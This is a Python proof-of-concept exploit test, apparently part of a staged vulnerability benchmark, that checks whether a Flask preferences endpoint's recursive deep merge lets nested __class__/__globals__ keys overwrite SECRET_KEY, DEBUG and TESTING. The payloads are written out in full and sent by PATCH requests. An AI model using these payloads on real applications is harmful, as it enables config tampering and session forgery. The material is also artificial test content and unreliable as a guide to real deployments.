"""PoC: Config pollution via recursive deep merge (CWE-1321).

After stage 3 adds a recursive deep_merge without dunder key filtering,
PATCH /api/preferences with nested __class__/__globals__ keys can
pollute Flask app config or override class-level attributes.
"""

from mosaic.oracle.exploit import ExploitTest


class FlaskDeepMergePollutionExploit(ExploitTest):
    """Pollute Flask config via deep merge on preferences endpoint."""

    @property
    def chain_id(self) -> str:
        return "flask_deep_merge_pollution"

    def setup(self) -> None:
        # Set initial preferences
        self.http_post("/api/preferences", json={
            "theme": "dark",
            "notifications": {"email": True},
        })

    def execute(self) -> tuple[bool, str]:
        evidence = []

        # Get baseline preferences
        baseline = self.http_get("/api/preferences")
        if baseline.ok:
            evidence.append(f"Baseline: {baseline.text[:200]}")

        # Test 1: Try to inject via __class__ traversal
        # This exploits Python's object model through dict merge
        payloads = [
            # Direct config pollution attempt
            {"__class__": {"__init__": {"__globals__": {"SECRET_KEY": "pwned"}}}},
            # Nested pollution via preferences merge path
            {"notifications": {"__class__": "polluted"}},
            # Try to set arbitrary top-level keys that might overlap with app state
            {"DEBUG": True, "SECRET_KEY": "pwned", "TESTING": True},
        ]

        for payload in payloads:
            resp = self.http_patch("/api/preferences", json=payload)
            if resp.ok:
                evidence.append(f"PATCH accepted: {payload}")

        # Verify: check if preferences now contain injected keys
        verify = self.http_get("/api/preferences")
        if verify.ok:
            try:
                data = verify.json()
                prefs_str = str(data)

                # Check if dunder keys were stored (merge didn't filter them)
                if "__class__" in prefs_str or "__init__" in prefs_str:
                    evidence.append("Dunder keys stored in preferences!")
                    return True, (
                        f"Deep merge pollution confirmed (CWE-1321). "
                        f"Recursive merge accepts __class__/__init__ keys. "
                        f"Attacker can traverse Python object graph. "
                        + " | ".join(evidence)
                    )

                # Check if config-like keys were merged
                if data.get("SECRET_KEY") or data.get("DEBUG") is True:
                    evidence.append(f"Config keys in prefs: SECRET_KEY={data.get('SECRET_KEY')}, DEBUG={data.get('DEBUG')}")
                    return True, (
                        f"Config pollution confirmed (CWE-1321). "
                        f"Deep merge stores arbitrary keys including config-sensitive ones. "
                        + " | ".join(evidence)
                    )
            except Exception as e:
                evidence.append(f"Parse error: {e}")

        return False, "Pollution not confirmed. " + " | ".join(evidence)
